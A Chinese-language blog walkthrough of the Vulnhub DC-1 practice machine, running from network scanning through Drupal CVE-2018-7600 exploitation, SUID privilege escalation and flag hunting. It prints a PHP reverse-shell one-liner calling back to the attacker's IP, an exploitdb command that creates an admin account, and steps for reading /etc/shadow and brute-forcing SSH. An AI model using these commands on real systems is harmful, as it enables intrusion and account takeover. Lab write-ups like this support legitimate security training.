---
title: Vulnhub - DC-1 の Write-Up
date: 2019-11-14 09:55:25
categories: 
- WriteUPs
- Vulnhub
tags: 
- Web
- DC Series
---
## 前言
今天看到FreeBuf上有一篇关于[VulHub DC-1](http://www.five86.com/downloads/DC-1.zip)靶机的教学，就自己下载了一台玩了一下。

<!-- more -->

## Step 1

首先肯定要扫描一下靶机的IP地址，在Kali中用nmap扫描一下整个网段。

![](/img/DC-1/DC-1-1.png)

172.16.12.134是Kali自己的地址，所以靶机的地址就是172.16.12.136了。然后再针对靶机扫描一下开放的端口和服务。

![](/img/DC-1/DC-1-2.png)

## Step 2

访问了下80端口的服务，发现是一个Drupal的cms。没有发现Web服务上有什么可乘之机，用nikto也扫了一下网站，做为辅助判断，也没有任何进展。

![](/img/DC-1/DC-1-3.png)

也用了Dirbuster探索了一下网站结构，找找有没有敏感文件，最终都一无所获。于是去百度上找了一下Drupal有什么漏洞，果不其然，找到一个CVE-2018-7600的远程代码执行漏洞，影响Drupal 6，7，8等多个子版本。正好nmap扫描时发现靶机上是Drupal 7，瞬间觉得找对了地方。

## Step 3

第一反应当然是MSF走起，`search cve-2018-7600`果然有东西。

![](/img/DC-1/DC-1-4.png)

MSF一通操作，so easy！

![](/img/DC-1/DC-1-5.png)

![](/img/DC-1/DC-1-6.png)

进入shell之后发现是一个非交互shell，想办法得到一个交互式shell。首先试了下php的反弹shell，执行命令`php -r '$sock=fsockopen("172.16.12.134",1234);exec("/bin/sh -i <&3 >&3 2>&3");'`可以回弹shell，但是输入命令没反应。只能换个法子，看了下系统环境，发现有Python 2.7的环境，利用下面的命令实现反弹shell。

```bash
python -c "import pty; pty.spawn('/bin/sh')"
```

![](/img/DC-1/DC-1-7.png)

## Step 4

发现www-data权限很低，接下来要进行提权操作。`uname -a`看了下系统版本，发现脏牛提权可能可以玩，但是不太好操作。最后选择了简单的[suid提权](https://coldwave96.github.io/2019/11/15/suid/)。

![](/img/DC-1/DC-1-8.png)

![](/img/DC-1/DC-1-9.png)

提权成功，开始在靶机中寻找flag，在/home/flag4文件夹下发现flag4.txt文件。

![](/img/DC-1/DC-1-10.png)

在/var/www文件夹下发现flag1.txt，就是在低权限用户www-data下发现的文件。

![](/img/DC-1/DC-1-11.png)

根据提示去找站点的配置文件/var/www/sites/default/settings.php，在文件中发现了flag2和数据库的帐号密码。

![](/img/DC-1/DC-1-12.png)

连接数据库，在数据库中继续寻找信息。

![](/img/DC-1/DC-1-13.png)

在users表里发现admin用户的信息。

![](/img/DC-1/DC-1-14.png)

## Step 5

### Solution 1

接下来尝试破解或者修改admin密码，Drupal对数据库中用户密码的加密脚本为网站根目录下scripts文件夹下的`password-hash.sh`。根据加密脚本解密肯定是一种南辕北辙的做法，虽然地球是圆的，理论上可以做到。但是简单直接的思路是加密新的我们设定的密码，然后对数据库中的admin密码进行替换。(参考链接：[http://drupalchina.cn/node/2128](http://drupalchina.cn/node/2128))

![](/img/DC-1/DC-1-15.png)

然后登陆Drupal，找到flag3。

![](/img/DC-1/DC-1-16.png)

### Solution 2

MSF的exploitdb中关于Drupal也存在不少的利用脚本，其中针对Drupal 7的有一个添加一个和admin权限相同用户的脚本，通过这个脚本可以创建一个administrator账户。

![](/img/DC-1/DC-1-17.png)

运行下面的命令。

```bash
python /usr/share/exploitdb/exploits/php/webapps/34992.py -t http://172.16.12.136 -u administrator -p 123456
```

![](/img/DC-1/DC-1-18.png)

同样的登陆Drupal，找到flag3。

![](/img/DC-1/DC-1-19.png)

## Step 6

最后好剩下一个flag，我自己是完全没想到。根据WriteUp，查看靶机/etc/shadow文件发现系统存在一个flag4用户，然后爆破ssh密码可以发现该用户的弱密码orange，登录后可以找到flag4，然后通过flag4找到最后一个flag在/root根目录下。

在root下也发现了这个flag，但是没有仔细看内容，所以放过了最后一个flag。

![](/img/DC-1/DC-1-20.png)

![](/img/DC-1/DC-1-21.png)